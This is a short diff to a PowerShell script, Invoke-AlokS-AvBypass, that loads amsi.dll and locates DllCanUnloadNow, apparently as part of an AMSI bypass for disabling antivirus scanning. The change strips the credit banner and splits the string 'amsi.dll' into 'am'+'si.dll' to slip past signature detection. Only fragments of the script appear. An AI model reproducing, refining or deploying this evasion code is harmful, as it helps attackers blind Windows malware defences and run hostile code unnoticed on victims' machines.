@@ -1,10 +1,5 @@
 function Invoke-AlokS-AvBypass
 {
-Write-Host "-- Bypassing Antivirus in Powershell --"
-Write-Host "--- Script Modified by Alok Saurabh ---"
-Write-Host "-- Credits to Paul Laîné & Avi Gimpel --"
-Write-Host ""
-
 $Kernel32 = @"
 using System;
 using System.Runtime.InteropServices;
@@ -43,7 +38,7 @@ Class Hunter {
     }
 }
 
-[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
+[IntPtr]$hModule = [Kernel32]::LoadLibrary("am"+"si.dll")
 Write-Host "[+] AMSI DLL Handle: $hModule"
 
 [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
